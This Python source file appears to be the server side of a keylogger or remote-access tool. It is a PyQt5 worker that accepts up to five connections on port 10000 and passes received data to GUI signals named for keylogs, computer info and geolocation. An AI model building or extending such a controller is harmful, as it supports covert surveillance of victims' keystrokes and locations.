import socket
import threading
from PyQt5.QtCore import pyqtSignal, QObject
from .client_handler import handle_client


class Worker(QObject):
    keylog_signal = pyqtSignal(str, str)
    computer_info_signal = pyqtSignal(str, str)
    geo_location_signal = pyqtSignal(str, str)

    def __init__(self, main_window):
        super().__init__()
        self.main_window = main_window
        self.clients = {}  # client_id -> socket

    def start_server(self):
        bindsocket = socket.socket()
        bindsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        bindsocket.bind(('0.0.0.0', 10000))
        bindsocket.listen(5)
        print("[*] Server listening on port 10000")

        while True:
            try:
                newsocket, fromaddr = bindsocket.accept()
                client_id = str(fromaddr)
                print(f"[DEBUG] Connection from {client_id}")

                # Check if max clients connected
                total_clients = 1 if self.main_window.client1_id else 0
                total_clients += len(self.main_window.client_windows)
                if total_clients >= 5:
                    print(f"[-] Connection rejected: too many clients.")
                    newsocket.close()
                    continue

                self.clients[client_id] = newsocket
                print(f"[+] Client {client_id} connected")

                # Delegate client assignment to main window method
                self.main_window.handle_new_client(client_id, newsocket)

                # Start a new thread to handle client data
                client_thread = threading.Thread(
                    target=handle_client,
                    args=(client_id, newsocket, self.main_window, self.clients),
                    daemon=True
                )
                client_thread.start()

            except Exception as e:
                print(f"[!] Error accepting client connection: {e}")


    def handle_client(self, client_id, newsocket):
        try:
            while True:
                try:
                    data = newsocket.recv(4096).decode()
                except Exception as e:
                    print(f"[!] Error decoding data from {client_id}: {e}")
                    break

                if data:
                    print(f"[+] Data from {client_id}: {data.strip()}")
                    self.main_window.handle_received_data(data.strip(), client_id)
                else:
                    break
        except Exception as e:
            print(f"[!] Error handling data from client {client_id}: {e}")
        finally:
            if client_id in self.clients:
                del self.clients[client_id]
            print(f"[-] Client {client_id} disconnected")
            self.main_window.handle_client_disconnection(client_id)
